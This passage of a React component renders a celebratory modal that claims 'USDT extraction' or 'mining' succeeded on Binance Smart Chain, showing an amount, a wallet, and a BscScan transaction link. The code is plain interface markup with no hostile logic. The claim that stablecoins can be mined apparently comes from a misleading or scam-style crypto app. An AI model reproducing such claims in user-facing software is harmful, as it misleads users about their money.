        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-xl animate-in fade-in zoom-in-95">
          <div className="glass-panel-gold rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-6 relative border-[#FDB813]/60 shadow-[0_0_50px_rgba(253,184,19,0.3)] text-center">
            
            {/* Celebration Icon Header */}
            <div className="relative mx-auto w-20 h-20">
              <div className="absolute inset-0 rounded-full bg-[#FDB813]/30 animate-ping" />
              <div className="relative w-20 h-20 rounded-full bg-gradient-to-tr from-[#FDB813] to-[#FFE066] flex items-center justify-center text-black shadow-xl shadow-[#FDB813]/40">
                <Sparkles className="w-10 h-10 animate-bounce" />
              </div>
            </div>

            {/* Greeting Title */}
            <div className="space-y-1.5">
              <span className="px-3 py-1 rounded-full text-xs font-montserrat font-bold bg-[#10B981]/20 text-[#10B981] border border-[#10B981]/40 uppercase tracking-widest inline-flex items-center gap-1.5">
                <CheckCircle2 className="w-3.5 h-3.5" />
                <span>Extraction Confirmed</span>
              </span>
              <h3 className="font-montserrat font-black text-2xl sm:text-3xl text-white uppercase tracking-wider">
                🎉 Mining Successful!
              </h3>
              <p className="font-montserrat text-xs text-gray-300">
                USDT extraction executed successfully on Binance Smart Chain
              </p>
            </div>

            {/* Transaction Data Card */}
            <div className="bg-black/60 rounded-2xl p-4 border border-white/10 space-y-3 font-mono text-left text-xs">
              <div className="flex items-center justify-between pb-2 border-b border-white/10">
                <span className="text-gray-400 text-[11px]">Mined Amount:</span>
                <span className="text-[#22D3EE] font-bold text-base">{mineGreeting.amount} USDT</span>
              </div>

              <div className="flex items-center justify-between">
                <span className="text-gray-400 text-[11px]">Target Wallet:</span>
                <div className="flex items-center gap-1">
                  <span className="text-white font-semibold">{`${mineGreeting.wallet.slice(0, 6)}...${mineGreeting.wallet.slice(-4)}`}</span>
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText(mineGreeting.wallet);
                      showToast('Address copied!', 'info');
                    }}
                    className="p-1 hover:bg-white/10 rounded text-gray-400 hover:text-white"
                  >
                    <Copy className="w-3 h-3" />
                  </button>
                </div>
              </div>

              <div className="flex items-center justify-between pt-1">
                <span className="text-gray-400 text-[11px]">Transaction Hash:</span>
                <a
                  href={`https://bscscan.com/tx/${mineGreeting.txHash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-[#FDB813] hover:underline flex items-center gap-1 font-semibold"
                >
                  <span>{`${mineGreeting.txHash.slice(0, 8)}...${mineGreeting.txHash.slice(-6)}`}</span>
                  <ExternalLink className="w-3 h-3" />
                </a>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex items-center gap-3 pt-2">
              <a
                href={`https://bscscan.com/tx/${mineGreeting.txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="flex-1 py-3.5 rounded-xl bg-white/10 hover:bg-white/15 border border-white/15 text-xs font-montserrat text-white flex items-center justify-center gap-1.5 transition-colors"
              >
                <span>View on BscScan</span>
                <ExternalLink className="w-3.5 h-3.5" />
              </a>

              <button
                onClick={() => setMineGreeting(null)}
                className="flex-1 py-3.5 rounded-xl btn-gold-glow text-xs font-bold"
              >
                Continue Operations
              </button>
            </div>

          </div>
        </div>
      )}


    </div>
  );
};
